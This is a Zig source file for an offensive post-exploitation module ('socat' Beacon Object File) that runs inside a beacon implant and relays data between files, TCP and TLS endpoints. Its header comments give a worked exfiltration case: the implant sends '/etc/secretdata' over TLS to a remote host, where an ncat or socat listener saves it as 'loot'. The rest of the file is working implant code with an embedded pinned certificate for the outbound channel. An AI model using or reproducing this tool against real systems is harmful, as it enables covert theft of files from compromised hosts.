///name: socat
///description: "Concatenate and redirect sockets"
///author: Z-Labs
///tags: ['windows', 'linux','TA0007', 'T1083', 'z-labs']
///category: "POSTEX-BOF"
///OS: cross-platform
///sources:
///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/socat.zig'
///examples: |
/// socat <src-address> <sink-address>
///
/// <src-address> - an address that acts as data source
/// <sink-address> - an address that acts as data sink
///
/// Currently available address types:
///   OPEN:<filename>
///   CREATE:<filename>
///   TCP:<host:port>
///   TLS:<host:ssl-enabled port>
///
/// Example use case: data exfiltration via TLS channel with z-beac0n:
///
/// Setting up listener with ncat on the server-side:
///   ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
/// OR with socat (original):
///   socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
///
/// In the implant:
///   z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
const std = @import("std");
const posix = @import("std").posix;
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;
const tls = @import("ianicTls");

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("__stackprobe__");
    @import("bof_api").embedFunctionCode("__divti3");
    @import("bof_api").embedFunctionCode("__ashlti3");
    @import("bof_api").embedFunctionCode("__divdi3");
    @import("bof_api").embedFunctionCode("__udivdi3");
    @import("bof_api").embedFunctionCode("__ashldi3");
    @import("bof_api").embedFunctionCode("__modti3");
    @import("bof_api").embedFunctionCode("__aeabi_uldivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidivmod");
    @import("bof_api").embedFunctionCode("__aeabi_uidiv");
    @import("bof_api").embedFunctionCode("__aeabi_llsl");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    AccesDenied = 0x1,
    NoArgsProvided,
    BadArgsProvided,
    NotSupportedAddressType,
    NoSuchFile,
    ConnectionError,
    DataTransferError,
    ReadFailedError,
    UnknownError,
};

const AddressType = enum(u8) {
    OPEN = 0x1,
    CREATE,
    STDIN,
    TCP,
    TLS,
    UNRECOGNIZED,
};

const minica_pem =
\\-----BEGIN CERTIFICATE-----
\\MIIDPzCCAiegAwIBAgIIa/kXZJi16EYwDQYJKoZIhvcNAQELBQAwIDEeMBwGA1UE
\\AxMVbWluaWNhIHJvb3QgY2EgNmJmOTE3MCAXDTI2MDUyNTEwMjMxMloYDzIxMjYw
\\NTI1MTAyMzEyWjAgMR4wHAYDVQQDExVtaW5pY2Egcm9vdCBjYSA2YmY5MTcwggEi
\\MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFguKvyy3iUvvLJDDlIiaIINh6
\\kUxDNC25df7emhhTFUXJMfZAPjXlz6l9I63Im/TJqQE8Dv2oEtcwD2OmHIdMIk/i
\\wSe/+8uC1QjqOBLSsfflfx2Say4OlvOCIrRy8QPqnRq3+U/I1wGIEe1ADH5UT+Dj
\\hcDitJbgKLdCJXlDSClPj5cCGEAPiuyM+kGW4MmY/2Gd9BVo2VTixXUBexTsV8ts
\\Lu3JRZqBzJuT4XZQ8qLRaXx/Xssgp+cxyoUsnFChWCBnev8uijJWTlSNkt/Rppt8
\\rvE6PoIXqvLn8oZ3f+2fO6j3j1pI+uXoBZkKnAi84InZRpbSLBmNHgnRndt9AgMB
\\AAGjezB5MA4GA1UdDwEB/wQEAwIChDATBgNVHSUEDDAKBggrBgEFBQcDATASBgNV
\\HRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBRn8LqQx8ZriglHcRLfdriR6ibn/zAf
\\BgNVHSMEGDAWgBRn8LqQx8ZriglHcRLfdriR6ibn/zANBgkqhkiG9w0BAQsFAAOC
\\AQEATlkzeKYzFLNXmDBV8zC951SMBsD36Gi/plwMmK8Bp117t5OGIPgE1JGZZxZq
\\ycVf/pejZlDkNl3VnbtWnnmQIzswpKoL59XJL/x/U/KBCmEURlQLAh6RlchL3rfj
\\Mz3T4ImG6N5IJv7Z61wTWqtIK1/t3dedoMpte/3oyK43NNQfRkiW7x7HGZHSa+lq
\\4ubgW+U9JSfdCDM7rgl6zXmpVZD8Ddo7IGuSiRULtIsSpAKEXOBzC63xB+QUCXta
\\8xMY4HSQQ8uXNnZm4kURKOcoMXxXv8OLsknJ40GOTtkULU0m2RK4D1lQMC8w0RRe
\\AO8i38yIm9foRIBxdVT/dDUG2w==
\\-----END CERTIFICATE-----
;

fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocator, cert_buf: []const u8) std.crypto.Certificate.Bundle.AddCertsFromFileError!void {

    const size = cert_buf.len;
    const decoded_size_upper_bound = size / 4 * 3;
    const needed_capacity = std.math.cast(u32, decoded_size_upper_bound + size) orelse
        return error.CertificateAuthorityBundleTooBig;
    try cb.bytes.ensureUnusedCapacity(alloc, needed_capacity);
    const end_reserved: u32 = @intCast(cb.bytes.items.len + decoded_size_upper_bound);
    const buffer = cb.bytes.allocatedSlice()[end_reserved..];
    @memcpy(buffer[0..size], cert_buf[0..size]);
    const encoded_bytes = buffer[0..size];

    const begin_marker = "-----BEGIN CERTIFICATE-----";
    const end_marker = "-----END CERTIFICATE-----";

    const base64 = std.base64.standard.decoderWithIgnore(" \t\r\n");

    const now_sec = std.time.timestamp();

    var start_index: usize = 0;
    while (std.mem.indexOfPos(u8, encoded_bytes, start_index, begin_marker)) |begin_marker_start| {
        const cert_start = begin_marker_start + begin_marker.len;
        const cert_end = std.mem.indexOfPos(u8, encoded_bytes, cert_start, end_marker) orelse
            return error.MissingEndCertificateMarker;
        start_index = cert_end + end_marker.len;
        const encoded_cert = std.mem.trim(u8, encoded_bytes[cert_start..cert_end], " \t\r\n");
        const decoded_start: u32 = @intCast(cb.bytes.items.len);
        const dest_buf = cb.bytes.allocatedSlice()[decoded_start..];
        cb.bytes.items.len += try base64.decode(dest_buf, encoded_cert);
        try cb.parseCert(alloc, decoded_start, now_sec);
    }
}

fn checkAddressType(addr_type: []const u8) AddressType {
    if(std.mem.eql(u8, "OPEN", addr_type)) {
        return AddressType.OPEN;
    } else if(std.mem.eql(u8, "CREATE", addr_type)) {
        return AddressType.CREATE;
    } else if(std.mem.eql(u8, "TCP", addr_type)) {
        return AddressType.TCP;
    } else if(std.mem.eql(u8, "TLS", addr_type)) {
        return AddressType.TLS;
    }
    else
        return AddressType.UNRECOGNIZED;
}

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    bofapi.print(.output, "A tu? 1", .{});
    if (alen == 0) {
        return @intFromEnum(BofErrors.NoArgsProvided);
    }

    const allocator = std.heap.page_allocator;

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var file_sink: ?std.fs.File = null;
    var file_src: ?std.fs.File = null;
    var tcp_src: ?std.net.Stream = null;
    var tcp_sink: ?std.net.Stream = null;

    var r_buffer: [tls.input_buffer_len]u8 = undefined;
    var r_iface: *std.Io.Reader = undefined;

    var w_buffer: [tls.output_buffer_len]u8 = undefined;
    var w_iface: *std.Io.Writer = undefined;

    var tls_buf: [tls.input_buffer_len]u8 = undefined;
    var conn_src: ?tls.Connection = null;
    var conn_sink: ?tls.Connection = null;

    var srcAddrType: AddressType = undefined;
    var src_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    var sinkAddrType: AddressType = undefined;
    var sink_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;

    const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);


    if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
        srcAddrType = AddressType.STDIN;

    // Checking type of <src-address>: get arg prefix and return its type:
    src_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(src_address, 0), ':');
    const srcPrefix = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
    srcAddrType = checkAddressType(srcPrefix);

    if (srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS) {

        //srcAddrType = checkAddressType(srcPrefix);
        //if (!(srcAddrType == AddressType.TCP or srcAddrType == AddressType.TLS))
        //    return @intFromEnum(BofErrors.NotSupportedAddressType);

        const host = src_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        bofapi.print(.output, "Host: {s}", .{host});
        const port = std.fmt.parseUnsigned(u16, src_addr_iter.next() orelse return 17, 10) catch return 1;

        tcp_src = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);

        var reader = tcp_src.?.reader(&r_buffer);
        r_iface = reader.interface();

        if (srcAddrType == AddressType.TLS) {
            var tls_writer = tcp_src.?.writer(&tls_buf);

            var root_ca: std.crypto.Certificate.Bundle = .{};
            const s: []const u8 = minica_pem[0..minica_pem.len];
            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
            defer root_ca.deinit(allocator);

            var diagnostic: tls.config.Client.Diagnostic = .{};

            conn_src = tls.client(r_iface, &tls_writer.interface, .{
                .host = host,
                .root_ca = root_ca,
                .diagnostic = &diagnostic,
            }) catch return 98;
        }
    }
    else if (srcAddrType == AddressType.OPEN) {

        const file_path = src_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
        file_src = std.fs.openFileAbsolute(file_path, .{ .mode = .read_only }) catch return @intFromEnum(BofErrors.NoSuchFile);

        var reader = file_src.?.reader(&r_buffer);
        r_iface = &reader.interface;
    }


    // Checking type of <sink-address>: get arg prefix and return its type:
    sink_addr_iter = std.mem.splitScalar(u8, std.mem.sliceTo(sink_address, 0), ':');
    const sinkPrefix = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
    sinkAddrType = checkAddressType(sinkPrefix);

    if (sinkAddrType == AddressType.CREATE) {

        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        file_sink = std.fs.createFileAbsolute(file_path, .{ .truncate = true }) catch return 1;
        //defer file.close();

        var writer = file_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;
    }
    else if (sinkAddrType == AddressType.OPEN) {

        const file_path = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.NoSuchFile);
        file_sink = std.fs.openFileAbsolute(file_path, .{ .mode = .write_only }) catch return @intFromEnum(BofErrors.NoSuchFile);

        var writer = file_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;
    }
    else if (sinkAddrType == AddressType.TCP or sinkAddrType == AddressType.TLS) {

        const host = sink_addr_iter.next() orelse return @intFromEnum(BofErrors.BadArgsProvided);
        bofapi.print(.output, "Host: {s}", .{host});
        const port = std.fmt.parseUnsigned(u16, sink_addr_iter.next() orelse return 17, 10) catch return 1;

        tcp_sink = std.net.tcpConnectToHost(allocator, host, port) catch return @intFromEnum(BofErrors.ConnectionError);

        var writer = tcp_sink.?.writer(&w_buffer);
        w_iface = &writer.interface;

        if (sinkAddrType == AddressType.TLS) {
            var tls_reader = tcp_sink.?.reader(&tls_buf);

            var root_ca: std.crypto.Certificate.Bundle = .{};
            const s: []const u8 = minica_pem[0..minica_pem.len];
            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
            defer root_ca.deinit(allocator);

            var diagnostic: tls.config.Client.Diagnostic = .{};

            conn_sink = tls.client(tls_reader.interface(), w_iface, .{
                .host = host,
                .root_ca = root_ca,
                .diagnostic = &diagnostic,
            }) catch return 98;
 
        }
    }

    var n: usize = 0;
    var temp_buf: [tls.output_buffer_len]u8 = undefined;
    while(true) {
        if(srcAddrType == AddressType.TLS) {
            n = conn_src.?.readAll(&temp_buf) catch return 34;
        } else
            n = r_iface.readSliceShort(&temp_buf) catch return 33;

        bofapi.print(.output, "N: {d}\n", .{n});

        if(sinkAddrType == AddressType.TLS) {
            conn_sink.?.writeAll(temp_buf[0..n]) catch return 97;
        } else
            w_iface.writeAll(temp_buf[0..n]) catch return 97;

        if (n < temp_buf.len)
            break;
    }
    w_iface.flush() catch return 97;
 

    std.Thread.sleep(1000000000);
    if(srcAddrType == AddressType.TLS) {
        conn_src.?.close() catch return 11;
        tcp_src.?.close();
    }

    std.Thread.sleep(1000000000);
    if(sinkAddrType == AddressType.TLS) {
        conn_sink.?.close() catch return 11;
        tcp_sink.?.close();
    }

    return 0;
}
